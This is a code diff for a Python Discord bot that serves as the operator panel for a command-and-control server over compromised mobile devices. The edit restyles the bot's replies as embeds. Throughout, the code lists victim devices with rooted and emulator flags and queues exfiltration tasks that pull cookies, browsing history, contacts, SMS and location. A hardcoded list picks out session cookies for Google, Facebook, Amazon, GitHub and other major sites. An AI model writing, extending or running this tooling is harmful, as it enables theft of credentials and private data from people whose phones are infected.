@@ -48,6 +48,41 @@ bot = commands.Bot(command_prefix=COMMAND_PREFIX, intents=intents)
 device_manager = DeviceManager()
 
 # ---------------------------------------------------------------------------
+# Embed color palette
+# ---------------------------------------------------------------------------
+
+_COLOR_SUCCESS = 0x57F287  # green  — data present / online
+_COLOR_ERROR = 0xED4245  # red    — failure / offline
+_COLOR_INFO = 0x5865F2  # blurple — neutral info
+_COLOR_NO_DATA = 0x99AAB5   # gray   — no data / unreachable
+
+# ---------------------------------------------------------------------------
+# Task emoji map
+# ---------------------------------------------------------------------------
+
+_TASK_EMOJIS: dict[str, str] = {
+    "request-cookies":   "🍪",
+    "request-history":   "📜",
+    "request-bookmarks": "🔖",
+    "request-contacts":  "👤",
+    "request-sms":       "💬",
+    "request-location":  "📍",
+}
+
+_HIGH_VALUE_COOKIE_DOMAINS = (
+    "https://www.google.com,"
+    "https://accounts.google.com,"
+    "https://www.facebook.com,"
+    "https://www.amazon.com,"
+    "https://twitter.com,"
+    "https://www.instagram.com,"
+    "https://www.reddit.com,"
+    "https://github.com,"
+    "https://www.linkedin.com,"
+    "https://www.netflix.com"
+)
+
+# ---------------------------------------------------------------------------
 # HTTP bridge to C2 server
 # ---------------------------------------------------------------------------
 
@@ -91,60 +126,55 @@ async def call_server(
         return None
 
 
-def format_server_devices(data: dict[str, Any]) -> str:
-    """Format a /admin/devices response into a Discord-friendly string."""
+# ---------------------------------------------------------------------------
+# Embed formatters
+# ---------------------------------------------------------------------------
+
+
+def format_server_devices(data: dict[str, Any]) -> discord.Embed:
+    """Format a /admin/devices response as a Discord embed."""
     devices = data.get("data", {}).get("devices", [])
+    online_count = sum(1 for d in devices if d.get("status") == "online")
+
     if not devices:
-        return f"✅ {data.get('message', 'No devices found')}"
-
-    lines = [f"✅ **Server Response — {data.get('message', '')}**"]
-    for d in devices:
-        status_emoji = "🟢" if d["status"] == "online" else "🔴"
-        badges = ""
-        if d.get("is_emulator"):
-            badges += " 🤖"
-        if d.get("is_rooted"):
-            badges += " 🔓"
-        carrier = f" | {d['carrier']}" if d.get("carrier") else ""
-        lines.append(
-            f"{status_emoji} **{d['name']}**{badges} — "
-            f"IP: `{d['ip']}`{carrier}"
+        return discord.Embed(
+            title="📡 Devices",
+            description="No devices registered.",
+            color=_COLOR_NO_DATA,
         )
-    return "\n".join(lines)
 
-
-_HIGH_VALUE_COOKIE_DOMAINS = (
-    "https://www.google.com,"
-    "https://accounts.google.com,"
-    "https://www.facebook.com,"
-    "https://www.amazon.com,"
-    "https://twitter.com,"
-    "https://www.instagram.com,"
-    "https://www.reddit.com,"
-    "https://github.com,"
-    "https://www.linkedin.com,"
-    "https://www.netflix.com"
-)
-
-_TASK_EMOJIS: dict[str, str] = {
-    "request-cookies": "🍪",
-    "request-history": "📜",
-    "request-bookmarks": "🔖",
-    "request-contacts": "👤",
-    "request-sms": "💬",
-    "request-location": "📍",
-}
+    color = _COLOR_SUCCESS if online_count > 0 else _COLOR_ERROR
+    embed = discord.Embed(
+        title=f"📡 Devices — {online_count}/{len(devices)} online",
+        color=color,
+    )
+    for d in devices:
+        status = "🟢" if d.get("status") == "online" else "🔴"
+        badges = (" 🤖" if d.get("is_emulator") else "") + (" 🔓" if d.get("is_rooted") else "")
+        carrier = f" · {d['carrier']}" if d.get("carrier") else ""
+        last_seen = (d.get("last_seen") or "")[:16].replace("T", " ")
+        embed.add_field(
+            name=f"{status} {d['name']}{badges}",
+            value=f"`{d['ip']}`{carrier}\nlast seen `{last_seen}`",
+            inline=True,
+        )
+    return embed
 
 
 def format_cached_for_task(
     results_data: dict[str, Any] | None,
     task_type: str,
     device_filter: str = "*",
-) -> str:
-    """Format cached results for a specific task type from /admin/results."""
+) -> discord.Embed:
+    """Build a Discord embed with cached results for a given task type."""
     emoji = _TASK_EMOJIS.get(task_type, "📄")
+
     if results_data is None:
-        return f"{emoji} **Cached data** — server unreachable."
+        return discord.Embed(
+            title=f"{emoji} {task_type}",
+            description="Server unreachable — no cached data.",
+            color=_COLOR_NO_DATA,
+        )
 
     results = results_data.get("data", {}).get("results_by_device", {})
     relevant: dict[str, Any] = {}
@@ -156,89 +186,79 @@ def format_cached_for_task(
             relevant[dev] = history[0]
 
     if not relevant:
-        return f"{emoji} **No cached data yet** for `{task_type}`."
+        return discord.Embed(
+            title=f"{emoji} {task_type}",
+            description=f"No cached data yet for `{task_type}`.",
+            color=_COLOR_NO_DATA,
+        )
 
-    lines = [f"{emoji} **Cached — `{task_type}`**"]
+    embed = discord.Embed(title=f"{emoji} {task_type}", color=_COLOR_SUCCESS)
     for dev, latest in relevant.items():
         status_icon = "✅" if latest.get("success") else "❌"
-        received = latest.get("received_at", "")[:19].replace("T", " ")
-        lines.append(f"  📱 **{dev}** — {status_icon} `{received}`")
+        received = (latest.get("received_at") or "")[:16].replace("T", " ")
         output = str(latest.get("data", {}).get("output", ""))
-        if output:
-            for line in output.split("\n")[:4]:
-                lines.append(f"    > {line[:120]}")
-            if len(output.split("\n")) > 4:
-                lines.append("    > *(… truncated)*")
-    return "\n".join(lines)
-
-
-def format_queue_confirmation(
-    queue_response: dict[str, Any] | None,
-    task_type: str,
-    device: str,
-) -> str:
-    """Format the queuing confirmation section of a /request-* response."""
-    target = "all devices" if device == "*" else f"`{device}`"
-    if queue_response and queue_response.get("status") == "success":
-        return (
-            f"\n📡 **Fresh `{task_type}` queued** for {target}.\n"
-            f"> Results arrive after the next beacon cycle.\n"
-            f"> Run this command again to see updated data."
+        lines = output.split("\n")
+        preview = "\n".join(lines[:8])[:800]
+        if len(lines) > 8:
+            preview += "\n…"
+        embed.add_field(
+            name=f"📱 {dev} {status_icon} · {received}",
+            value=f"```\n{preview}\n```" if preview.strip() else "*empty*",
+            inline=False,
         )
-    if queue_response is None:
-        return "\n❌ **Could not queue** — server unreachable."
-    return f"\n❌ **Queue failed** — {queue_response.get('message', 'unknown error')}."
+    return embed
 
 
-def format_server_simple(data: dict[str, Any]) -> str:
-    """Format a simple success/error response."""
-    status = data.get("status", "unknown")
-    message = data.get("message", "")
-    emoji = "✅" if status == "success" else "❌"
-    return f"{emoji} {message}"
-
-
-def format_server_results(data: dict[str, Any]) -> str:
-    """Format a /admin/results response into a Discord-friendly string."""
+def format_server_results(data: dict[str, Any]) -> discord.Embed:
+    """Format a /admin/results response as a Discord embed."""
     results = data.get("data", {}).get("results_by_device", {})
+
     if not results:
-        return "📭 No task results stored yet. Queue a task and wait for the next beacon cycle."
+        return discord.Embed(
+            title="📊 Results",
+            description=(
+                "No task results stored yet. "
+                "Queue a task and wait for the next beacon cycle."
+            ),
+            color=_COLOR_NO_DATA,
+        )
 
-    task_emojis: dict[str, str] = {
-        "request-cookies": "🍪",
-        "request-history": "📜",
-        "request-bookmarks": "🔖",
-        "request-contacts": "👤",
-        "request-sms": "💬",
-        "request-location": "📍",
-    }
-
-    lines = [f"📊 **{data.get('message', 'Task Results')}**"]
+    embed = discord.Embed(
+        title=f"📊 {data.get('message', 'Task Results')}",
+        color=_COLOR_INFO,
+    )
     for device_name, device_results in results.items():
-        lines.append(f"\n📱 **{device_name}**")
+        lines = []
         for task_type, history in device_results.items():
-            emoji = task_emojis.get(task_type, "📄")
-            # history is a list (newest first); show latest + count
             if not history:
                 continue
+            emoji = _TASK_EMOJIS.get(task_type, "📄")
             latest = history[0]
             status_icon = "✅" if latest.get("success") else "❌"
-            received = latest.get("received_at", "")[:19].replace("T", " ")
-            count_label = f" *(+{len(history) - 1} older)*" if len(history) > 1 else ""
-            lines.append(
-                f"  {emoji} `{task_type}` — {status_icon} `{received}`{count_label}"
+            received = (latest.get("received_at") or "")[:16].replace("T", " ")
+            count_label = f" (+{len(history) - 1})" if len(history) > 1 else ""
+            lines.append(f"{emoji} `{task_type}` {status_icon} `{received}`{count_label}")
+        if lines:
+            embed.add_field(
+                name=f"📱 {device_name}",
+                value="\n".join(lines),
+                inline=False,
             )
-            output = str(latest.get("data", {}).get("output", ""))
-            if output:
-                for line in output.split("\n")[:5]:
-                    lines.append(f"    > {line[:120]}")
-                if len(output.split("\n")) > 5:
-                    lines.append("    > *(… more lines truncated)*")
+    return embed
 
-    response = "\n".join(lines)
-    if len(response) > 1900:
-        response = response[:1900] + "\n…*(truncated — check /admin/results for full data)*"
-    return response
+
+def format_server_simple(data: dict[str, Any]) -> discord.Embed:
+    """Format a simple success/error response as a Discord embed."""
+    status = data.get("status", "unknown")
+    message = data.get("message", "")
+    if status == "success":
+        return discord.Embed(description=f"✅ {message}", color=_COLOR_SUCCESS)
+    return discord.Embed(description=f"❌ {message}", color=_COLOR_ERROR)
+
+
+def _wrap_standalone(text: str) -> discord.Embed:
+    """Wrap a standalone/fallback text response in a neutral embed."""
+    return discord.Embed(description=text, color=_COLOR_NO_DATA)
 
 
 # ---------------------------------------------------------------------------
@@ -294,7 +314,7 @@ async def _handle_request_command(
 ) -> None:
     """Shared handler for all /request-* commands: show cache + queue fresh task."""
     results = await call_server("/admin/results")
-    cached_section = format_cached_for_task(results, task_type, device)
+    embed = format_cached_for_task(results, task_type, device)
 
     queue_response = await call_server(
         "/admin/queue-task",
@@ -305,8 +325,17 @@ async def _handle_request_command(
             "parameters": parameters or {},
         },
     )
-    queue_section = format_queue_confirmation(queue_response, task_type, device)
-    await interaction.response.send_message(cached_section + queue_section)
+
+    target = "all devices" if device == "*" else device
+    if queue_response and queue_response.get("status") == "success":
+        footer = f"📡 Fresh task queued for {target} · re-run after next beacon"
+    elif queue_response is None:
+        footer = "❌ Could not queue — server unreachable"
+    else:
+        footer = f"❌ Queue failed — {queue_response.get('message', 'unknown error')}"
+
+    embed.set_footer(text=footer)
+    await interaction.response.send_message(embed=embed)
 
 
 # ---------------------------------------------------------------------------
@@ -327,7 +356,6 @@ async def on_ready() -> None:
     except Exception as e:
         logger.error("Failed to sync commands: %s", e)
 
-    # Check server connectivity.
     health = await call_server("/health")
     if health:
         logger.info("C2 server is reachable — server bridge active")
@@ -385,14 +413,56 @@ async def show_devices(interaction: discord.Interaction) -> None:
 
     log_command(interaction, "show-devices")
 
-    # Try server first, fall back to local.
     server_response = await call_server("/admin/devices")
     if server_response:
-        response = format_server_devices(server_response)
+        embed = format_server_devices(server_response)
     else:
-        response = device_manager.show_devices()
+        embed = _wrap_standalone(device_manager.show_devices())
 
-    await interaction.response.send_message(response)
+    await interaction.response.send_message(embed=embed)
+
+
+@bot.tree.command(
+    name="device-info",
+    description="Show full fingerprint details for a specific device.",
+)
+@app_commands.describe(device="Device name (e.g. POCO_F5)")
+async def device_info(interaction: discord.Interaction, device: str) -> None:
+    """Display rich fingerprint data for the requested device."""
+    if not is_admin_user(interaction):
+        log_access_denied(interaction, "device-info")
+        await interaction.response.send_message(
+            "🚫 **Access denied.** You are not authorised to use this bot.",
+            ephemeral=True,
+        )
+        return
+
+    log_command(interaction, "device-info", f"device={device}")
+
+    server_response = await call_server(f"/admin/device-info/{device}")
+    if server_response:
+        d = server_response.get("data", {})
+        is_online = d.get("status") == "online"
+        badges = (" 🤖" if d.get("is_emulator") else "") + (" 🔓" if d.get("is_rooted") else "")
+        embed = discord.Embed(
+            title=f"📱 {d.get('name')}{badges}",
+            color=_COLOR_SUCCESS if is_online else _COLOR_ERROR,
+        )
+        status_val = f"{'🟢' if is_online else '🔴'} {d.get('status')}"
+        embed.add_field(name="Status", value=status_val, inline=True)
+        embed.add_field(name="IP", value=f"`{d.get('ip')}`", inline=True)
+        embed.add_field(name="OS", value=f"`{d.get('os_info', 'unknown')}`", inline=True)
+        embed.add_field(name="Carrier", value=f"`{d.get('carrier', 'unknown')}`", inline=True)
+        embed.add_field(name="Apps", value=f"`{d.get('installed_apps_count', 0)}`", inline=True)
+        last_seen = (d.get("last_seen") or "")[:16].replace("T", " ")
+        embed.add_field(name="Last seen", value=f"`{last_seen}`", inline=True)
+    else:
+        embed = discord.Embed(
+            description=f"❌ Could not retrieve device info for `{device}`.",
+            color=_COLOR_ERROR,
+        )
+
+    await interaction.response.send_message(embed=embed)
 
 
 @bot.tree.command(
@@ -420,34 +490,11 @@ async def set_beacon_interval(
         "/admin/beacon-interval", method="POST", json_body={"interval": interval}
     )
     if server_response:
-        response = format_server_simple(server_response)
+        embed = format_server_simple(server_response)
     else:
-        response = device_manager.set_beacon_interval(interval)
+        embed = _wrap_standalone(device_manager.set_beacon_interval(interval))
 
-    await interaction.response.send_message(response)
-
-
-@bot.tree.command(
-    name="request-cookies",
-    description="Show cached cookies and queue a fresh cookie request.",
-)
-@app_commands.describe(device="Target device name (or '*' for all devices)")
-async def request_cookies(
-    interaction: discord.Interaction,
-    device: str = "*",
-) -> None:
-    """Show cached cookies and queue a fresh exfiltration task."""
-    if not is_admin_user(interaction):
-        log_access_denied(interaction, "request-cookies")
-        await interaction.response.send_message(
-            "🚫 **Access denied.** You are not authorised to use this bot.",
-            ephemeral=True,
-        )
-        return
-    log_command(interaction, "request-cookies", f"device={device}")
-    await _handle_request_command(
-        interaction, "request-cookies", device, {"domains": _HIGH_VALUE_COOKIE_DOMAINS}
-    )
+    await interaction.response.send_message(embed=embed)
 
 
 @bot.tree.command(
@@ -477,11 +524,34 @@ async def set_communication_protocol(
         json_body={"protocol": protocol},
     )
     if server_response:
-        response = format_server_simple(server_response)
+        embed = format_server_simple(server_response)
     else:
-        response = device_manager.set_communication_protocol(protocol)
+        embed = _wrap_standalone(device_manager.set_communication_protocol(protocol))
 
-    await interaction.response.send_message(response)
+    await interaction.response.send_message(embed=embed)
+
+
+@bot.tree.command(
+    name="request-cookies",
+    description="Show cached cookies and queue a fresh cookie request.",
+)
+@app_commands.describe(device="Target device name (or '*' for all devices)")
+async def request_cookies(
+    interaction: discord.Interaction,
+    device: str = "*",
+) -> None:
+    """Show cached cookies and queue a fresh exfiltration task."""
+    if not is_admin_user(interaction):
+        log_access_denied(interaction, "request-cookies")
+        await interaction.response.send_message(
+            "🚫 **Access denied.** You are not authorised to use this bot.",
+            ephemeral=True,
+        )
+        return
+    log_command(interaction, "request-cookies", f"device={device}")
+    await _handle_request_command(
+        interaction, "request-cookies", device, {"domains": _HIGH_VALUE_COOKIE_DOMAINS}
+    )
 
 
 @bot.tree.command(
@@ -628,7 +698,7 @@ async def device_name_autocomplete(
             name = d["name"]
             if current == "" or name.startswith(current.lower()):
                 choices.append(app_commands.Choice(name=name, value=name))
-    return choices[:25]  # Discord limit
+    return choices[:25]
 
 
 # ---------------------------------------------------------------------------
@@ -642,7 +712,7 @@ async def device_name_autocomplete(
 @app_commands.autocomplete(device=device_name_autocomplete, task_type=task_type_autocomplete)
 @app_commands.describe(
     device="Target device name (or '*' for all devices)",
-    task_type="Type of task to queue (request-cookies, request-history, request-bookmarks)",
+    task_type="Type of task to queue",
     parameters="Optional JSON parameters for the task",
 )
 async def queue_task(
@@ -682,11 +752,14 @@ async def queue_task(
         },
     )
     if server_response:
-        response = format_server_simple(server_response)
+        embed = format_server_simple(server_response)
     else:
-        response = "❌ Server unreachable — cannot queue tasks in standalone mode."
+        embed = discord.Embed(
+            description="❌ Server unreachable — cannot queue tasks in standalone mode.",
+            color=_COLOR_ERROR,
+        )
 
-    await interaction.response.send_message(response)
+    await interaction.response.send_message(embed=embed)
 
 
 @bot.tree.command(
@@ -707,11 +780,14 @@ async def show_results(interaction: discord.Interaction) -> None:
 
     server_response = await call_server("/admin/results")
     if server_response:
-        response = format_server_results(server_response)
+        embed = format_server_results(server_response)
     else:
-        response = "❌ Server unreachable — cannot retrieve results."
+        embed = discord.Embed(
+            description="❌ Server unreachable — cannot retrieve results.",
+            color=_COLOR_ERROR,
+        )
 
-    await interaction.response.send_message(response)
+    await interaction.response.send_message(embed=embed)
 
 
 @bot.tree.command(
@@ -734,55 +810,18 @@ async def pending_tasks(interaction: discord.Interaction) -> None:
     if server_response:
         pending = server_response.get("data", {}).get("pending_by_device", {})
         if not pending:
-            response = "✅ No pending tasks."
+            embed = discord.Embed(description="✅ No pending tasks.", color=_COLOR_SUCCESS)
         else:
-            lines = ["📋 **Pending Tasks**"]
+            embed = discord.Embed(title="📋 Pending Tasks", color=_COLOR_INFO)
             for dev, count in pending.items():
-                lines.append(f"  📱 **{dev}** — {count} task(s)")
-            response = "\n".join(lines)
+                embed.add_field(name=f"📱 {dev}", value=f"{count} task(s)", inline=True)
     else:
-        response = "❌ Server unreachable — cannot check pending tasks."
-
-    await interaction.response.send_message(response)
-
-
-@bot.tree.command(
-    name="device-info",
-    description="Show full fingerprint details for a specific device.",
-)
-@app_commands.describe(device="Device name (e.g. POCO_F5)")
-async def device_info(interaction: discord.Interaction, device: str) -> None:
-    """Display rich fingerprint data for the requested device."""
-    if not is_admin_user(interaction):
-        log_access_denied(interaction, "device-info")
-        await interaction.response.send_message(
-            "🚫 **Access denied.** You are not authorised to use this bot.",
-            ephemeral=True,
+        embed = discord.Embed(
+            description="❌ Server unreachable — cannot check pending tasks.",
+            color=_COLOR_ERROR,
         )
-        return
 
-    log_command(interaction, "device-info")
-
-    server_response = await call_server(f"/admin/device-info/{device}")
-    if server_response:
-        d = server_response.get("data", {})
-        status_emoji = "🟢" if d.get("status") == "online" else "🔴"
-        emulator_line = " 🤖 *emulator*" if d.get("is_emulator") else ""
-        rooted_line = " 🔓 *rooted*" if d.get("is_rooted") else ""
-        lines = [
-            f"📱 **Device: {d.get('name')}**{emulator_line}{rooted_line}",
-            f"  Status: {status_emoji} {d.get('status')}",
-            f"  IP: `{d.get('ip')}`",
-            f"  OS: `{d.get('os_info')}`",
-            f"  Carrier: `{d.get('carrier', 'unknown')}`",
-            f"  Installed apps: `{d.get('installed_apps_count', 0)}`",
-            f"  Last seen: `{d.get('last_seen')}`",
-        ]
-        response = "\n".join(lines)
-    else:
-        response = f"❌ Could not retrieve device info for `{device}`."
-
-    await interaction.response.send_message(response)
+    await interaction.response.send_message(embed=embed)
 
 
 # ---------------------------------------------------------------------------
